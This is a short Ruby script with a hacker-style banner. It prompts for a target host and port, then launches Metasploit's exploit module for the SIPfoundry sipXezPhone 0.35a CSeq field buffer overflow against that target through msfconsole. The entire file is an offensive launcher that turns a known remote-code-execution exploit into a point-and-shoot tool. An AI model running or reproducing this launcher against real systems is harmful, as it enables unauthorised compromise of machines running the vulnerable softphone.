
require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
        SIPfoundry sipXezPhone 0.35a CSeq Field Overflow

""".red
puts """
	 1st Try {set RPORT 5060; 2nd RPORT 5061}""".white
puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? [Default is 5060]".blue
print " [!] ---> ".yellow
port = gets.chomp







exec("msfconsole -x 'use exploit/windows/sip/sipxezphone_cseq ' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

